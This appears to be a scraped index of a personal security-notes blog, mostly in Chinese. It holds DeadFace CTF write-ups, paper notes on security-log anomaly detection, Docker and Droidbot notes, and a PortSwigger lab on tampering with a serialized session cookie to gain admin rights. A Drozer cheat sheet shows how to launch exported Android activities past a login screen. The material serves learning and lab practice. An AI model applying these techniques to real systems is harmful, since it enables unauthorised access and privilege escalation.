\u0026#39;tell\u0026#39;, \u0026#39;box\u0026#39;, \u0026#39;alarm\u0026#39;, \u0026#39;life\u0026#39;, \u0026#39;necessary\u0026#39;] def print_password(nums): if len(nums) \u0026lt; 1: print(\u0026#34;Must provide a list of at least one number i.e. [1]\u0026#34;) return (\u0026#34;flag{{{}}}\u0026#34;.format(\u0026#34; \u0026#34;.join([arr[num] for num in nums]))) def left_shift(s, n): return \u0026#39;\u0026#39;.join(chr(ord(char) - n) for char in s) Recon # 看了第一個hint才有點頭緒，先用他提供的left_shift function，先看有沒有特別的部分，忽然看到貌似base64，忽然就拿到flag了\nExploit # ct = \u0026#39;buA9kvZ=T_A}b[J8l:@ob_tviPZtb_\u0026lt;olOpxkvZ=T_=xju]olOpxkvZ=T_bxlu]olOpxkvZ=QIEE\u0026#39; from base64 import b64decode for i in range(50): guess = left_shift(ct, i) try: guess = b64decode(guess).decode(\u0026#39;utf-8\u0026#39;) print(guess) except: pass pt = [41, 2, 18, 39, 35, 30] print(print_password(pt)) Flag: flag{the current plan is world domination}\nChatty Cathy # Description # That Python dead drop program put Aurora Pharmaceuticals\u0026rsquo; IT team on high alert; they looked closer at notifications in their Security Operation Center (SOC) and identified even more malware deep in the network! They retrieved a compiled binary along with some rough code from yet another infected user workstation. It appears to be some sort of Command and Control server, but requires a password to be accessed. Intel indicates that the full flag from Dead Drop may work as the password.. Dig into this program and see what secrets it holds.\nSubmit the flag as: flag{flag text here}.\nSource Code # :::spoiler Source Code\ntypedef struct { struct in_addr address; unsigned short port; unsigned short start_cmd; } settings; void check_pass(){ char password[60]; printf(\u0026#34;Enter password: \u0026#34;); scanf(\u0026#34;%59[^\\n]s\u0026#34;, password); // TODO: Check password } settings* get_settings(){ settings *serv_settings = (settings*)malloc(sizeof(settings)); serv_settings-\u0026gt;start_cmd = 0; printf(\u0026#34;Enter Command Number: \u0026#34;); scanf(\u0026#34;%hu\u0026#34;, \u0026amp;(serv_settings-\u0026gt;start_cmd)); if(serv_settings-\u0026gt;start_cmd != 0){ printf(\u0026#34;Invalid command number.\\n\u0026#34;); exit(0); } printf(\u0026#34;Enter Listening Address: \u0026#34;); char addr[16]; scanf(\u0026#34;%15s\u0026#34;, addr); inet_pton(AF_INET, addr, \u0026amp;(serv_settings-\u0026gt;address)); printf(\u0026#34;Enter Listening Port: \u0026#34;); scanf(\u0026#34;%lu\u0026#34;, \u0026amp;(serv_settings-\u0026gt;port)); return serv_settings; } int setup_socket(settings *serv_settings){ int listenfd = 0; listenfd = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in serv_addr; serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(serv_settings-\u0026gt;port); serv_addr.sin_addr = serv_settings-\u0026gt;address; int fd = socket(AF_INET, SOCK_STREAM, 0); bind(fd, (struct sockaddr *)\u0026amp;serv_addr, sizeof(serv_addr)); return fd; } void print_flag(){ // TODO: Print out flag. } void record_message(char *message){ FILE *fp = fopen(\u0026#34;./log.txt\u0026#34;, \u0026#34;a\u0026#34;); fprintf(fp, message); fclose(fp); } void print_error(){ printf(\u0026#34;The server received a message from the client but is unable to display it.\\n\u0026#34;); } void handle_message(unsigned short start_cmd, char *message){ switch(start_cmd){ case 0: record_message(message); break; case 1: print_flag(); break; default: print_error(); } } void accept_conns(int socket, settings *serv_settings){ bind(socket, (struct sockaddr *)\u0026amp;serv_settings, sizeof(serv_settings)); listen(socket,5); char address[INET_ADDRSTRLEN]; inet_ntop(AF_INET, \u0026amp;(serv_settings-\u0026gt;address), address, INET_ADDRSTRLEN); printf(\u0026#34;Listening for connections on %s:%hu\\n\u0026#34;, address, serv_settings-\u0026gt;port); int conn; char message[100] = \u0026#34;\u0026#34;; while(conn = accept(socket, (struct sockaddr *)NULL, NULL)) { int pid; if((pid = fork()) == 0) { while (recv(conn, message, 100, 0)\u0026gt;0) { handle_message(serv_settings-\u0026gt;start_cmd, \u0026amp;message); *message = \u0026#34;\u0026#34;; } exit(0); } } } int main() { check_pass(); settings *serv_settings = get_settings(); int socket = setup_socket(serv_settings); accept_conns(socket, serv_settings); free(serv_settings); printf(\u0026#34;Complete\\n\u0026#34;); return 0; } :::\nRecon # 這一題有點微妙，觀念是簡單的，連pwn都算不上，但還是pwn的觀念，基本上要從這一支程式拿到flag，在有source code的情況下甚麼都好說，不然以這種狀態要找到print flag的function真的要逆到死\nExploit # 我的作法是直接不管他所有的check然後跳到print_flag function讓他直接吐flag給我這樣\n$ gdb not_c2_server gef➤ r Starting program: /mnt/d/NTU/CTF/DeadFace/Misc/Chatty Cathy/not_c2_server Enter password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Breakpoint 1, 0x000000000040176c in ?? () gef➤ j *0x40194A Continuing at 0x40194a. flag{heaps and stacks and bugs oh my!} Program received signal SIGSEGV, Segmentation fault. 0x00000000004019d7 in ?? () Flag: flag{heaps and stacks and bugs oh my!}\nThe CDR of the CAR\u0026hellip; RAH, RAH, RAH!!! # Description # :::spoiler\nThe LISP programming language (which stands for “Lots of Insane and Stupid Parentheses”) was used as an early form of list processing. There was even a “LISP COMPUTER” where the assembly language was LISP!\nLISP was famous (infamous?) for its numerous parentheses. Miss one, and the whole program fails!\nLISP had among its data types “atoms” (single items) and “lists” (multiple items), formatted like this:\n(apple tomato (grape bear (banana)) ((President Trump),(President Obama))) Two of LISP’s most famous functions were car (which returns the first item in a list), and cdr (which returns all but the first item in a list). They could be used, together with recursion, to perform loops. In fact, early LISP had no native looping structure other than recursion.\nAttached to this challenge is a flat list of words. To obtain the flag, create a program in Python that calls emulated car and cdr functions (already provided for you) to produce the correct list. The list has to be grouped into a list of atoms and lists such that the program, as described by the Lytton, IN High School Basketball Cheerleaders, produces the correct list. Use their cheer to lay out the function calls in a series of nested calls…\nThe cheer goes like this:\nThe CDR (1) of the CAR! The CDR of the CAR! The CAR of the CDR of the CDR of the CAR! The CAR of the CDR of the CDR of the CAR (12)!\nHence, the first CDR (1) is the outermost call, and the CAR (12) is the innermost call. The single parameter is the complete list of words in the wordlist, grouped appropriately to produce the output list.\n(1) (12) cdr(car(cdr(car... car((\u0026#39;fish\u0026#39;, (\u0026#39;vermin\u0026#39;,\u0026#39;blatant\u0026#39;,(\u0026#39;ascent\u0026#39;...)))) Here is the input wordlist as a flat list, without grouping, as well as the expected output and instructions for submitting your answer to obtain the flag.\nSubmit your answer to the server like this:\necho \u0026ldquo;car(cdr((\u0026ldquo;blah\u0026rdquo;, \u0026ldquo;blah\u0026rdquo;)))\u0026rdquo; | nc -nv 143.198.226.223 50000 :::\nRecon # 這一題很特別，應該算是目前比較難的題目，他主要是介紹了LISP這個語言，然後用他指定的兩個function(CAR/CDR)輸出特定的list，CAR主要return了第0個item，而CDR是return除了第0個以外的其他item，用python寫就會是以下這樣:\ndef car(a): return a[0] def cdr(a): return a[1:] 然後他已經定義了一套function的call stack應該長怎樣: cdr(car(cdr(car(car(cdr(cdr(car(car(cdr(cdr(car(List)))))))))))) 而預期的輸出應該是: ('pugnacious', 'wallaby', 'savant', 'zarf') 所以重點是要如何設計中間的List，另外他有給initial phrase\n(\u0026#39;ascent\u0026#39;,\u0026#39;xray\u0026#39;,\u0026#39;yarbrough\u0026#39;,\u0026#39;jackal\u0026#39;,\u0026#39;minstrel\u0026#39;,\u0026#39;nevermore\u0026#39;,\u0026#39;outcast\u0026#39;,\u0026#39;kitten\u0026#39;,\u0026#39;victor\u0026#39;,\u0026#39;pugnacious\u0026#39;,\u0026#39;wallaby\u0026#39;,\u0026#39;savant\u0026#39;,\u0026#39;zarf\u0026#39;,\u0026#39;tango\u0026#39;,\u0026#39;ultimatum\u0026#39;,\u0026#39;papyrus\u0026#39;,\u0026#39;quill\u0026#39;,\u0026#39;renegade\u0026#39;,\u0026#39;llama\u0026#39;,\u0026#39;ghost\u0026#39;,\u0026#39;hellscape\u0026#39;,\u0026#39;industrious\u0026#39;,\u0026#39;zombification\u0026#39;,\u0026#39;bestial\u0026#39;,\u0026#39;cadre\u0026#39;,\u0026#39;dark\u0026#39;,\u0026#39;efficacious\u0026#39;,\u0026#39;foundational\u0026#39;) 順序不能調，但中間要如何增減括號都無所謂，所以我設計了一套自己的演算法: 從最開頭往回看，也就是cdr→car→cdr→car\u0026hellip;\n只要看到cdr，則只需要括前面的item 若碰到car，則圈後面，並包含前一個狀態所有東西包起來 如果碰到錯誤，應該就是讓串入function的參數變成兩個以上，此時只要把payload全部加上括號就可以了 這樣才可以按照順序慢慢拆回來變成我們要的樣子，演算法這樣設計應該算是top-down的模式，至於圈多少就各自判斷，只要判斷完後可以剛好圈完就好，因為cdr主要是往前圈，car是往後圈，所以我會判斷，cdr和car各有幾個，然後分配一下每一次要圈多少\nExploit - Try \u0026amp; Error # Initial State 因為我們知道最後要的是中間的('pugnacious', 'wallaby', 'savant', 'zarf')，所以第一個遇到的是cdr，他會取第一個以外其他的items，所以我們要圈前面的item，會變成這樣: ('victor','pugnacious', 'wallaby', 'savant', 'zarf') 遇到car要圈後面，再包含前一個狀態全部包起來，也就是會變成(('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')) 遇到cdr則只需要圈前面的item，會變成(('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')) 遇到car就會是(('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')),('quill','renegade','llama') ((('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')),('quill','renegade','llama')),('ghost','hellscape','industrious') ('minstrel','nevermore'),((('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')),('quill','renegade','llama')),('ghost','hellscape','industrious') ('yarbrough','jackal'),('minstrel','nevermore'),((('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')),('quill','renegade','llama')),('ghost','hellscape','industrious') (('yarbrough','jackal'),('minstrel','nevermore'),((('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')),('quill','renegade','llama')),('ghost','hellscape','industrious')),('zombification','bestial','cadre') ((('yarbrough','jackal'),('minstrel','nevermore'),((('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')),('quill','renegade','llama')),('ghost','hellscape','industrious')),('zombification','bestial','cadre')),('dark','efficacious') ('xray'),((('yarbrough','jackal'),('minstrel','nevermore'),((('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')),('quill','renegade','llama')),('ghost','hellscape','industrious')),('zombification','bestial','cadre')),('dark','efficacious') ('ascent'),('xray'),((('yarbrough','jackal'),('minstrel','nevermore'),((('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')),('quill','renegade','llama')),('ghost','hellscape','industrious')),('zombification','bestial','cadre')),('dark','efficacious') ((('ascent'),('xray'),((('yarbrough','jackal'),('minstrel','nevermore'),((('outcast','kitten'),('victor','pugnacious','wallaby','savant','zarf'),('tango','ultimatum','papyrus')),('quill','renegade','llama')),('ghost','hellscape','industrious')),('zombification','bestial','cadre')),('dark','efficacious')),('foundational')) $ echo \u0026#34;cdr(car(cdr(car(car(cdr(cdr(car(car(cdr(cdr(car((((\u0026#39;ascent\u0026#39;),(\u0026#39;xray\u0026#39;),(((\u0026#39;yarbrough\u0026#39;,\u0026#39;jackal\u0026#39;),(\u0026#39;minstrel\u0026#39;,\u0026#39;nevermore\u0026#39;),(((\u0026#39;outcast\u0026#39;,\u0026#39;kitten\u0026#39;),(\u0026#39;victor\u0026#39;,\u0026#39;pugnacious\u0026#39;,\u0026#39;wallaby\u0026#39;,\u0026#39;savant\u0026#39;,\u0026#39;zarf\u0026#39;),(\u0026#39;tango\u0026#39;,\u0026#39;ultimatum\u0026#39;,\u0026#39;papyrus\u0026#39;)),(\u0026#39;quill\u0026#39;,\u0026#39;renegade\u0026#39;,\u0026#39;llama\u0026#39;),(\u0026#39;ghost\u0026#39;,\u0026#39;hellscape\u0026#39;,\u0026#39;industrious\u0026#39;))),(\u0026#39;zombification\u0026#39;,\u0026#39;bestial\u0026#39;,\u0026#39;cadre\u0026#39;)),(\u0026#39;dark\u0026#39;,\u0026#39;efficacious\u0026#39;)),(\u0026#39;foundational\u0026#39;))))))))))))))\u0026#34; | nc -nv 143.198.226.223 50000 Connection to 143.198.226.223 50000 port [tcp/*] succeeded! Send me your answer... You are CORRECT!!! flag{BABY_you_can_DRIVE_my_CDR!!!} 其實答案有很多種，除了圈多圈少以外，圈法也有很多種，只要local端可以過，愛怎麼圈就怎麼圈\nFlag: flag{BABY_you_can_DRIVE_my_CDR!!!}\nCrypto # Letter Soup # Description # We believe we have ran into one of the newest members of DEADFACE while they were waiting for the train. The member seemed to have gotten spooked and stood up suddenly to jump on the train right before the doors shut. They seemed to have gotten away, but dropped this innocent looking word search. I believe this member might be actually a courier for DEADFACE. Let’s solve the word search to decode the mystery message. We believe the message might tell us their next move.\nSubmit the flag as flag{TARGETNAME} (e.g., flag{THISISTHEANSWER})\nRecon # 這一題想了很久，明明是低分的題目卻沒有其他想法(應該說很多想法卻屢屢碰壁)，最後是看其他人的WP才恍然大悟，其實和一開始想得差不多，就是把填字遊戲完成後把沒有圈到的字由左到右集合起來再用ROT的方式找flag，就是最後的步驟卡住，其實有點misc的感覺，蠻新鮮的? Flag: flag{ASBLACKFEATHERSSHINEINTHESUN}\nRefill on Soup # Description # How could we have missed this?? There were TWO word searches stuck together that the DEADFACE courier dropped. We’ve already solved the first one, but maybe solving this second word search will help us uncover the secret message they’re trying to covertly relay to the other members of DEADFACE. Hopefully, THIS will tell us how they plan to execute their next move.\nSubmit the flag as flag{TARGETNAME} (e.g., flag{THISISTHEANSWER})\nRecon # 和上一題一模一樣的操作，解密之後會是: GO TO THE LAST LINE FOR THE FLAG ANSWER THAT GOES INSIDE THE BRACKETS STOP GJPDWWXOPSESMCGMAQLDXTWONVUOMKDEALPXXUZUWMA ASTHEYFLYACROSS Flag: flag{ASTHEYFLYACROSS}\nExploit # Reference # "},{"id":95,"href":"/survey-papers/ml-dl-+-security/deepcase-semi-supervised-contextual-analysis-of-security-events---notes/","title":"DEEPCASE Semi-Supervised Contextual Analysis of Security Events - Notes","section":"Survey Papers","content":" DEEPCASE Semi-Supervised Contextual Analysis of Security Events - Notes # tags: Meeting Paper NTU # :::info Van Ede, T., Aghakhani, H., Spahn, N., Bortolameotti, R., Cova, M., Continella, A., \u0026hellip; \u0026amp; Vigna, G. (2022, May). Deepcase: Semi-supervised contextual analysis of security events. In 2022 IEEE Symposium on Security and Privacy (SP) (pp. 522-539). IEEE. :::\nBackground # What is NSM(Network Security Monitors)?\nNSM主要目的是偵測、找出入侵者，提高能見度。它建立在「我們一定會被攻擊，而且最終防禦一定會被突破」的思惟上。假設意志堅決的駭客最終打穿我們辛苦建立的防禦，但只要能在入侵者進一步破壞、感染系統前偵測、做出回應，讓入侵者無法達到目的，便能阻擋這波攻擊\nNSM不是等接收IDS/IPS等等資安設備觸發警示後才開始收集，而是平時便預先主動收集資料，提供NSM平台審視、分析，強化可見度，主動找出入侵軌跡\nWhat is IDS(Intrusion Detection Systems)?\n入侵偵測系統（Intrusion Detection System，IDS）是用來偵測資訊系統或網路上潛在的惡意破壞活動\n網路型入侵偵測系統(NIDS):主要是由一個或多個偵測器，加上收集與分析資料的主控臺所組成，可以分析每個通過的網路封包，並與已知的攻擊特徵進行比對，如果符合某項攻擊特徵，系統就會啟動防護機制，例如發簡訊或命令防火牆中斷該連線。 主機型入侵偵測系統(HIDS):是從主機系統稽核日誌檔演進而來，必須在主機上安裝代理程式﹙Agent﹚，負責監視主機內部的程序，並監控記錄檔與可疑活動，若有任何系統事件都會被記錄至日誌檔，並與攻擊特徵資料庫比對，判斷主機是否遭到攻擊 誘捕型入侵偵測系統(Deception Systems):目的是偵測未經授權的活動，任何進出誘捕系統的封包都會被認定是可疑的。但它卻是受到爭議的產品，有些廠商認為誘捕型系統只適合學術研究，因為它誘導駭客上勾，因此收集的證據無法用來起訴駭客 Basic security event checking workflow\ngraph TD; NSM/IDS--\u0026gt;SOC; SOC--\u0026gt;lower_tier_security_operators; lower_tier_security_operators--\u0026gt;senior_security_operators; 什麼是 SSL/TLS 憑證？\nSSL/TLS 憑證是一種數位物件，允許系統驗證身分並隨後使用 Secure Sockets Layer/Transport Layer Security (SSL/TLS) 協定，與另一個系統建立加密網路連線。憑證是在稱為公開金鑰基礎設施 (PKI) 的加密系統內使用。如果雙方都信任第三方 (稱為憑證授權單位)，PKI 會使用憑證讓其中一方建立另一方的身分。因此，SSL/TLS 憑證可作為數位身份證，用於保護網路通訊安全，以及為網際網路上的網站和私有網路上的資源建立身分。\nWhat is SIEM(Security Information and Event Management)\nSIEM的功能和一般日誌管理工具類似，都會將來自不同伺服器和設備的日誌和事件紀錄集中在一個地方 (通常是Log server伺服器本身硬碟或特定的儲存池Storage pool)，避免日誌和紀錄隨著機器故障遺失，符合稽核要求，可以進行關鍵字或日期查詢，所以也有人直接用日誌管理工具來進行分析 功能\n彙整、解讀多項系統設備日誌 資料圖形化 SIEM具備強大的比對Correlation 功能 e.g.帳號登入失敗、創建新帳號、帳號權限提升等等可能是攻擊行為也可能是網管的正常登入，要看一連串的流量或封包資料才能判斷$\\to$耗費人力 整合其他資安工具或資安服務 What is URI\nURI 可以：\n單獨表示 URL 單獨表示 URN 兩者兼具 e.g. https://www.example.com.tw/index.html urn:isbn:9780132350884 Model Background NTU ADL - Attention Mechanism 注意力機制 NTU ML - 自注意力機制 (Self-attention) (上) NTU ML - 自注意力機制 (Self-attention) (下) NTU ML - 自編碼器 (Auto-encoder) (上) – 基本概念 NTU ML - 自編碼器 (Auto-encoder) (下) GRU VS LSTM\nModel Trick Label Smooth KL Divergence DBSCAN\nExperience Metrics Precision, Recall, F1-score, Accuracy Homogeneity Score\nAbout Attack Bladabindi\n"},{"id":96,"href":"/survey-papers/ml-dl-+-security/deeplog_-anomaly-detection-and-diagnosis-from-system-logs-through-deep-learning/","title":"DeepLog: Anomaly Detection and Diagnosis from System Logs through Deep Learning","section":"Survey Papers","content":" DeepLog: Anomaly Detection and Diagnosis from System Logs through Deep Learning # tags: Meeting Paper NTU # :::info Du, M., Li, F., Zheng, G., \u0026amp; Srikumar, V. (2017, October). Deeplog: Anomaly detection and diagnosis from system logs through deep learning. In Proceedings of the 2017 ACM SIGSAC conference on computer and communications security (pp. 1285-1298). :::\nBackground # Model - Log Parser Longest Common Subsequence(LCS) 認識 OpenStack\nSome attack Blind Return Oriented Programming(BROP)\n"},{"id":97,"href":"/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/","title":"Deserialization - APPRENTICE","section":"Securities","content":" Deserialization - APPRENTICE # tags: Portswigger Web Security Academy Web # Lab: Modifying serialized objects # Description: This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. Goal: To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos\u0026rsquo;s account. You can log in to your own account using the following credentials: wiener:peter Recon # Login First \u0026amp; Recon the package According to the description, we know that the user verification has insecure deserialization. Therefore, we can recon the package first as below. You can notice the session is a base64-encoded string and we use the built-in feature in burp suite to decode it. Session: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d Decoded String: O:4:\u0026quot;User\u0026quot;:2:{s:8:\u0026quot;username\u0026quot;;s:6:\u0026quot;wiener\u0026quot;;s:5:\u0026quot;admin\u0026quot;;b:0;} How about Modify the session directly Exp - Change Directly # We can use the built-in feature to change our session to admin=1 directly to then send it forward. :::info Each package may contain the session that should be modified. So, pay attention to before sending it forward ::: Delete Carlos :::spoiler Success Screenshot :::\n"},{"id":98,"href":"/tools/others/directory-fuzzing---traversal-tools/directory-fuzzing_traversal-tools/","title":"Directory Fuzzing/Traversal Tools","section":"Tools","content":" Directory Fuzzing/Traversal Tools # According Survey Paper # :::info Aggarwal, V., Kaur, D., Mittal, S., Prasad, T. J. S., Batra, D., \u0026amp; Garg, A. (2023, August). A Comparative Study of Directory Fuzzing Tools. In 2023 International Conference on Circuit Power and Computing Technologies (ICCPCT) (pp. 1368-1374). IEEE. ::: feroxbuster Wfuzz gobuster Dirbuster According to CSDN Blog - 推薦幾款優秀的目錄掃描工具 # 7kbscan-WebPathBrute dirsearch BBScan ihoneyBakFileScan_Modify According to CSDN Blog - 滲透測試|目錄掃描 # DirMap 御劍 According to Google # PmWebDirScan Dirscan Dirb Dirsearch Ffuf "},{"id":99,"href":"/tools/others/docker-cheat-sheet/","title":"Docker Cheat Sheet","section":"Tools","content":" Docker Cheat Sheet # Background # Docker筆記 - Docker基礎教學 Docker筆記 - 進入Container，建立並操作 PostgreSQL Container Docker筆記 - 更改Container的Configuration Docker筆記 - 讓資料遠離Container，使用 Volume、Bind Mount 與 Tmpfs Mount Docker Docker Compose與Dockerfile差別 Docker Compose 指令\nCommand # Know docker container name $ docker ps # Then you\u0026#39;ll find the container name at the end of the result Go into container bash shell $ docker exec -it \u0026lt;container_name\u0026gt; bash # 以root的身份進入container # 極度建議以此方法進入bash $ docker exec -u root -it \u0026lt;container_id\u0026gt; /bin/bash Check Log $ docker-compose logs 啟動所有的 Docker Container 指令如下 $ docker-compose up -d 停止 docker-compose 執行的所有 Container $ docker-compose stop 刪除 docker-compose 的所有 Container $ docker-compose rm Leave Container exit or ctrl-D 利用Dockerfile build一個Images並且實際跑起來 $ docker run -it --rm $(docker build -q .) /bin/sh :::spoiler 實作\n$ docker pull httpd # with the latest version $ docker images # check the current images status REPOSITORY TAG IMAGE ID CREATED SIZE httpd latest 75a48b16cd56 4 days ago 168MB $ docker create --name test -p 8080:80 httpd # create a container with the name test and port number is 80 70fd43b63fa04c0daebd8128eff7ec58de26cb5c4c7bf63c0cf30fd03d07f1ab $ docker start 70fd43b63fa0 # start the container 70fd43b63fa0 $ docker ps -a # check container status CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 70fd43b63fa0 httpd \u0026#34;httpd-foreground\u0026#34; 2 minutes ago Up 27 seconds 0.0.0.0:8080-\u0026gt;80/tcp test $ docker exec -it test bash # get into container with bash shell as terminal root@70fd43b63fa0:/usr/local/apache2# :::\nReference # Day 24：使用 Docker-Compose 啟動多個 Docker Container 設定php.ini 【Day 3】 - Docker 基本指令操作 PADNS Midterm Reference # 使用 docker 架設 wordpress 網站 ubuntu安装nginx报错:Failed to start A high performance web server and a reverse proxy server\n執行步驟 # Destroy Droplet Use the new password to login(be send by Digital Ocean) And then change your password. Follow the note to install requirement application $ apt-get update $ apt-get install ca-certificates curl gnupg lsb-release $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg $ echo \\ \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\u0026#34; | tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null $ apt-get update $ apt-get install docker-ce docker-ce-cli containerd.io $ docker run hello-world $ curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose $ chmod +x /usr/local/bin/docker-compose $ docker-compose --version Deploy docker $ docker-compose up -d 外網掛域名 $ apt install nginx -y $ vim /etc/nginx/sites-enabled/website $ vim docker-compose.yml # add hostname: test.fei.works $ service nginx restart :::danger It can not set https ::: "},{"id":100,"href":"/tools/others/android-app-crawler/droidbot/","title":"Droidbot","section":"Tools","content":" Droidbot # Official Github Repo其實也說明得非常清楚，但在初次執行的時候可能會出現以下問題，按照 APP自動化全站爬取探索 ，只要修改./droidbot/app.py的line 28就可以了 :::spoiler Execution Problem\n$ droidbot -a ./base.apk/Mattermost.apk -grant_perm -script ./my_pass_login_script.json -keep_app INFO:Device:disable minicap on sdk \u0026gt;= 32 Traceback (most recent call last): File \u0026#34;d:\\ntu\\thesis\\mitm framework\\code\\appcrawler\\droidbot\\droidbot\\droidbot.py\u0026#34;, line 96, in __init__ self.app = App(app_path, output_dir=self.output_dir) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;d:\\ntu\\thesis\\mitm framework\\code\\appcrawler\\droidbot\\droidbot\\app.py\u0026#34;, line 28, in __init__ from androguard.core.bytecodes.apk import APK ModuleNotFoundError: No module named \u0026#39;androguard.core.bytecodes\u0026#39; [CONNECTION] ADB is disconnected WARNING:DroidBotIme:Failed to disconnect DroidBotIME! Traceback (most recent call last): File \u0026#34;d:\\ntu\\thesis\\mitm framework\\code\\appcrawler\\droidbot\\droidbot\\droidbot.py\u0026#34;, line 96, in __init__ self.app = App(app_path, output_dir=self.output_dir) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;d:\\ntu\\thesis\\mitm framework\\code\\appcrawler\\droidbot\\droidbot\\app.py\u0026#34;, line 28, in __init__ from androguard.core.bytecodes.apk import APK ModuleNotFoundError: No module named \u0026#39;androguard.core.bytecodes\u0026#39; During handling of the above exception, another exception occurred: Traceback (most recent call last): File \u0026#34;\\\\?\\C:\\Users\\berni\\anaconda3\\envs\\mitmproxy\\Scripts\\droidbot-script.py\u0026#34;, line 33, in \u0026lt;module\u0026gt; sys.exit(load_entry_point(\u0026#39;droidbot\u0026#39;, \u0026#39;console_scripts\u0026#39;, \u0026#39;droidbot\u0026#39;)()) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;d:\\ntu\\thesis\\mitm framework\\code\\appcrawler\\droidbot\\start.py\u0026#34;, line 145, in main droidbot = DroidBot( ^^^^^^^^^ File \u0026#34;d:\\ntu\\thesis\\mitm framework\\code\\appcrawler\\droidbot\\droidbot\\droidbot.py\u0026#34;, line 116, in __init__ self.stop() File \u0026#34;d:\\ntu\\thesis\\mitm framework\\code\\appcrawler\\droidbot\\droidbot\\droidbot.py\u0026#34;, line 191, in stop if hasattr(self.input_manager.policy, \u0026#34;master\u0026#34;) and \\ ^^^^^^^^^^^^^^^^^^^^^^^^^ AttributeError: \u0026#39;NoneType\u0026#39; object has no attribute \u0026#39;policy\u0026#39; ::: # from androguard.core.bytecodes.apk import APK from androguard.core.apk import APK How to use # 一般使用 # $ droidbot -a \u0026lt;path to apk\u0026gt; -o \u0026lt;path to output\u0026gt; :::warning 如果遇到任何出現寫入資訊錯誤或是decode出現錯誤的狀況，要直接看stack回推，並且把encoding改成utf-8，以autodroid為例是在./droidbot/device_state.py的#63，加入encoding='utf-8', droidbot的忘記在哪裡改了，總之也是同樣的問題\ndef _save_important_view_ids(self): _, _, _, important_view_ids = self.get_described_actions(remove_time_and_ip=False) ids_path = self.device.output_dir +\u0026#39;/states_view_ids\u0026#39; if not os.path.exists(ids_path): os.mkdir(ids_path) # if not isinstance(current_state, str): # current_state_str = current_state.state_str # else: # current_state_str = current_state important_view_id_path = self.device.output_dir +\u0026#39;/states_view_ids/\u0026#39;+ self.state_str + \u0026#39;.txt\u0026#39; f = open(important_view_id_path, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) f.write(str(important_view_ids)) f.close() :::\n"},{"id":101,"href":"/tools/others/android-related/drozer/drozer-cheat-sheet/","title":"Drozer Cheat Sheet","section":"Tools","content":" Drozer Cheat Sheet # Basic Console # 基本上最常用的command就是\ndz\u0026gt; run \u0026lt;drozer module\u0026gt; \u0026lt;optional object\u0026gt; # 啟動內建的module做到依稀操作 dz\u0026gt; help \u0026lt;drozer module\u0026gt; # 查看該module的說明以及參數設定 dz\u0026gt; run app.package.list #列出所有已安裝的app package dz\u0026gt; run app.package.list -f \u0026lt;key word\u0026gt; #列出特定的app package dz\u0026gt; run app.package.info -a \u0026lt;app package name\u0026gt; # 列出該app的基本訊息 dz\u0026gt; run app.package.manifest \u0026lt;app package name e.g. jakhar.aseem.diva\u0026gt; # 查看AndroidManifest.xml的資訊 dz\u0026gt; run app.package.attacksurface \u0026lt;app package name e.g. com.mwr.example.sieve\u0026gt; # 查看該app有什麼攻擊面 Attack Surface: 3 activities exported # 也許可以啟動一個activity並且bypass某種應該阻止我啟動他的權限 0 broadcast receivers exported 2 content providers exported # 也許可以fetch private data或是利用某些漏洞 e.g. sqli or path traversal 2 services exported is debuggable 接著根據得到的資訊看要用以下哪一種的攻擊模式\nactivities exported # 如果確定該app的AndroidManifest.xml有設定==android:export=\u0026ldquo;true\u0026rdquo;==，就代表有機會bypass他的權限，根據[^csdn-androidmanifest-xml]這個地方的風險如下:\nandroid:exported 這個屬性用於指示該服務是否能夠被其他應用程序組件call或跟它interact。如果設置為true，則callable或interactable，否則不能。設置為false時，只有同一個應用程序的組件或帶有相同用戶ID的應用程序才能啟動或綁定該服務。\n列出export activities有哪些 dz\u0026gt; run app.activity.info -a \u0026lt;app package name\u0026gt; 啟動activity dz\u0026gt; run app.activity.start --component \u0026lt;app package name\u0026gt; \u0026lt;activity name fetched by above command\u0026gt; 此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass ![Screenshot_20240603-163856](https://hackmd.io/_uploads/rkrr-ZsNA.png =200x) services exported # 和上面的問題差不多，只是差在被export的是services\n列出export services有哪些 dz\u0026gt; run app.service.info -a \u0026lt;app package nam\u0026gt; 與該services互動 